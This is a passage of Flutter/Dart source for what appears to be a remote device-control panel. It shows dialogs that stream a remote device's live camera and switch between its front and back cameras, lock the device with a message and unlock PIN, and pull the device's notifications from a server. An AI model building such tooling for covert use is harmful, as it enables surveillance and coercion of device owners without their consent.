                          style: const TextStyle(
                            color: _T.ink,
                            fontSize: 14,
                            fontWeight: FontWeight.w800,
                            letterSpacing: -0.2,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 10, vertical: 4),
                        decoration: BoxDecoration(
                          color: _T.success.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: Text(
                          '$_fps FPS',
                          style: const TextStyle(
                            color: _T.success,
                            fontSize: 10,
                            fontWeight: FontWeight.w800,
                            letterSpacing: 0.5,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                // Frame
                Container(
                  constraints: BoxConstraints(
                    maxHeight: MediaQuery.of(context).size.height * 0.55,
                  ),
                  color: const Color(0xFF0A0A12),
                  child: _frame != null
                      ? Image.memory(
                          _frame!,
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                        )
                      : const SizedBox(
                          height: 220,
                          child: Center(
                            child: CircularProgressIndicator(
                              color: _T.primary,
                              strokeWidth: 2.5,
                            ),
                          ),
                        ),
                ),
                // Actions
                Padding(
                  padding: const EdgeInsets.all(14),
                  child: Row(
                    children: [
                      Expanded(
                        child: _dialogBtn(
                          label: 'Switch',
                          icon: Icons.cameraswitch_rounded,
                          outlined: true,
                          onTap: () {
                            final isFront = _liveTitle.contains('Front');
                            _stopLive();
                            Future.delayed(
                                const Duration(milliseconds: 300), () {
                              _startLive('live_camera_start',
                                  isFront ? 'back' : 'front');
                            });
                          },
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: _dialogBtn(
                          label: 'Stop',
                          icon: Icons.stop_rounded,
                          gradient: _T.gradDanger,
                          onTap: () {
                            _stopLive();
                            Navigator.pop(ctx);
                          },
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  // ─── LOCK + CHAT DIALOG ──────────────────────────────────────────────
  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => _modernDialog(
        title: 'Lock + Chat',
        icon: Icons.lock_rounded,
        iconGradient: _T.gradPrimary,
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Lock device and enable two-way chat',
              style: TextStyle(color: _T.inkMid, fontSize: 13),
            ),
            const SizedBox(height: 16),
            _buildTextField(msgCtrl, 'Lock message',
                hint: 'Device locked by admin'),
            const SizedBox(height: 12),
            _buildTextField(pinCtrl, 'Unlock PIN',
                hint: '1234', isNum: true),
          ],
        ),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            outlined: true,
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'LOCK',
            icon: Icons.lock_rounded,
            onTap: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty
                  ? 'DEVICE LOCKED'
                  : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty
                  ? '1234'
                  : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
          ),
        ],
      ),
    );
  }

  // ─── NOTIFICATIONS FETCH ─────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/get-notifications/$_id'))
          .timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        _showListDialog(
            'Notifications', list, Icons.notifications_rounded, _T.purple);
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }
}